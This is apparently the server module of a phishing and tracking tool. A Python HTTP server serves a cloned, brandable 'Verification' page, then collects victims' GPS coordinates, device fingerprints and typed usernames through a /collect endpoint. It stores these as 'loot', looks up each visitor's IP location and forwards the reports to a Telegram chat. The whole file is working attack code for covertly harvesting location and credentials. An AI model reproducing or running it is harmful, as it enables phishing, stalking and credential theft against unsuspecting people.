import os
import json
import http.server
import socketserver
import urllib.request
from datetime import datetime
from logger import AuditLogger
from database import DatabaseManager
from colors import Colors
from cloner import TemplateCloner

class AuraHandler(http.server.SimpleHTTPRequestHandler):
    redirect_url = "https://google.com"
    brand_name = "Verification"
    telegram_token = None
    telegram_chat_id = None
    theme = "dark"
    accent = None
    custom_css = None

    def log_message(self, format, *args):
        pass

    def get_ip_intel(self, ip):
        try:
            if ip in ("127.0.0.1", "::1", "localhost"):
                return "Localhost / Private IP"
            url = f"http://ip-api.com/json/{ip}?fields=status,country,city,isp"
            req = urllib.request.Request(url, headers={'User-Agent': 'AuraTrace-Intel'})
            with urllib.request.urlopen(req, timeout=3) as resp:
                data = json.loads(resp.read().decode())
                if data.get('status') == 'success':
                    return f"{data.get('city')}, {data.get('country')} | ISP: {data.get('isp')}"
        except Exception:
            pass
        return "Unknown ISP/Location"

    def do_GET(self):
        try:
            client_ip = self.client_address[0]
            current_time = datetime.now().strftime('%H:%M:%S')
            print(f"{Colors.GREY}[{current_time}] {Colors.CYAN}[*] Connection inbound from IP: {Colors.BOLD}{client_ip}{Colors.RESET}")

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            # Generate dynamic template based on user choice
            rendered = TemplateCloner.generate_template(
                AuraHandler.brand_name,
                AuraHandler.redirect_url,
                theme=getattr(AuraHandler, "theme", "dark"),
                accent=getattr(AuraHandler, "accent", None),
                custom_css=getattr(AuraHandler, "custom_css", None),
            )
            self.wfile.write(rendered.encode('utf-8'))
        except Exception:
            pass

    def do_POST(self):
        if self.path != '/collect':
            self.send_response(404)
            self.end_headers()
            return

        try:
            client_ip = self.client_address[0]
            forwarded = self.headers.get('X-Forwarded-For')
            if forwarded:
                client_ip = forwarded.split(',')[0].strip()

            content_len = int(self.headers.get('Content-Length', 0))
            if not content_len:
                self.send_response(400)
                self.end_headers()
                return

            body = json.loads(self.rfile.read(content_len).decode('utf-8'))
            msg_type = body.get('type')
            current_time = datetime.now().strftime('%H:%M:%S')

            if msg_type == 'status':
                status_msg = body.get('message')
                print(f"{Colors.GREY}[{current_time}] {Colors.YELLOW}[LIVE ACTIVITY] ({client_ip}) -> {Colors.WHITE}{status_msg}{Colors.RESET}")

            elif msg_type == 'geo':
                lat = body.get('lat')
                lon = body.get('lon')
                acc = body.get('acc')
                ip_intel = self.get_ip_intel(client_ip)
                maps_link = f"https://www.google.com/maps?q={lat},{lon}"
                
                print(f"\n{Colors.GREEN}{Colors.BOLD}[+] TARGET GPS CAPTURED SUCCESSFULLY!{Colors.RESET}")
                print(f"{Colors.CYAN} ├── IP Intel    : {Colors.WHITE}{ip_intel}{Colors.RESET}")
                print(f"{Colors.CYAN} ├── Latitude    : {Colors.RED}{lat}{Colors.RESET}")
                print(f"{Colors.CYAN} ├── Longitude   : {Colors.RED}{lon}{Colors.RESET}")
                print(f"{Colors.CYAN} ├── Accuracy    : {Colors.YELLOW}{acc} meters{Colors.RESET}")
                print(f"{Colors.CYAN} └── Google Maps : {Colors.UNDERLINE}{Colors.YELLOW}{maps_link}{Colors.RESET}\n")
                
                report = f"[+] TARGET GPS: {lat}, {lon} | IP: {client_ip}\nMaps: {maps_link}"
                AuditLogger.save_loot(report)
                DatabaseManager.log_hit(client_ip, "GEOLOCATION", json.dumps(body), maps_link)
                AuditLogger.send_alert(report, None, AuraHandler.telegram_token, AuraHandler.telegram_chat_id)

            elif msg_type == 'fingerprint':
                ip_intel = self.get_ip_intel(client_ip)
                input_usr = body.get('inputUser', 'N/A')
                print(f"\n{Colors.MAGENTA}{Colors.BOLD}[+] DEEP TELEMETRY & CREDENTIALS RECEIVED!{Colors.RESET}")
                print(f"{Colors.CYAN} ├── Input User  : {Colors.GREEN}{input_usr}{Colors.RESET}")
                print(f"{Colors.CYAN} ├── IP Intel    : {Colors.WHITE}{ip_intel}{Colors.RESET}")
                print(f"{Colors.CYAN} ├── Platform    : {Colors.WHITE}{body.get('platform')} (Lang: {body.get('lang')}){Colors.RESET}")
                print(f"{Colors.CYAN} ├── Client Hints: {Colors.WHITE}{body.get('clientHints')}{Colors.RESET}")
                print(f"{Colors.CYAN} ├── Orientation : {Colors.WHITE}{body.get('orientation')}{Colors.RESET}")
                print(f"{Colors.CYAN} ├── Hardware    : {Colors.WHITE}{body.get('cores')} Cores | RAM: {body.get('ram')} GB{Colors.RESET}")
                print(f"{Colors.CYAN} ├── Storage     : {Colors.WHITE}{body.get('storage')}{Colors.RESET}")
                print(f"{Colors.CYAN} ├── Battery     : {Colors.WHITE}{body.get('battery')}{Colors.RESET}")
                print(f"{Colors.CYAN} ├── Network     : {Colors.WHITE}{body.get('network')}{Colors.RESET}")
                print(f"{Colors.CYAN} └── GPU Renderer: {Colors.WHITE}{body.get('gpu')}{Colors.RESET}\n")

                report = f"""
[+] DEEP TELEMETRY HIT: {client_ip}
Input Username: {input_usr}
Platform: {body.get('platform')} | TZ: {body.get('tz')}
Client Hints: {body.get('clientHints')}
Orientation: {body.get('orientation')}
Hardware: {body.get('cores')} Cores | RAM: {body.get('ram')} GB
GPU: {body.get('gpu')}
Battery: {body.get('battery')} | Net: {body.get('network')}
"""
                AuditLogger.save_loot(report.strip())
                DatabaseManager.log_hit(client_ip, "DEEP_TELEMETRY", json.dumps(body), ip_intel)
                AuditLogger.send_alert(report.strip(), None, AuraHandler.telegram_token, AuraHandler.telegram_chat_id)

            self.send_response(200)
            self.end_headers()
        except Exception as e:
            print(f"{Colors.RED}[!] Error processing POST request: {e}{Colors.RESET}")
            try:
                self.send_response(500)
                self.end_headers()
            except Exception:
                pass

class AuraServerManager:
    @staticmethod
    def start_server(port, brand_name, redirect_output, tg_token=None, tg_chat_id=None,
                     theme="dark", accent=None, custom_css=None):
        DatabaseManager.init_db()
        AuraHandler.brand_name = brand_name
        AuraHandler.redirect_url = redirect_output
        AuraHandler.telegram_token = tg_token
        AuraHandler.telegram_chat_id = tg_chat_id
        AuraHandler.theme = theme or "dark"
        AuraHandler.accent = accent
        AuraHandler.custom_css = custom_css

        server = socketserver.ThreadingTCPServer(("", port), AuraHandler)
        return server